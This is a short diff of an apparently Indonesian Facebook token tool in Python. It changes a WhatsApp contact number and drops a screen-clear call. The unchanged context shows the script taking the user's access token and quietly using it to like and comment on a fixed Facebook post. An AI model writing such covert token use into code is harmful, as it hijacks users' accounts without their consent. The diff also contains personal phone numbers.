@@ -62,7 +62,6 @@ class login:
 	def __init__(self):
 		self.ada = []
 	def __login__(self):
-		os.system('clear')
 		banner()
 		token = input(' [*] Masukan token : ')
 		if token in ['']:
@@ -96,7 +95,7 @@ class login:
 		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
 		requests.post('https://graph.facebook.com/3086614624895671/comments/?message='+komen+'&access_token=' + toket)
 		requests.post('https://graph.facebook.com/3086614624895671/likes?summary=true&access_token=' + toket)
-		os.system('xdg-open wa.me/6285772148224')
+		os.system('xdg-open wa.me/62895386194665')
 		menu().main()
 		
 def menu():
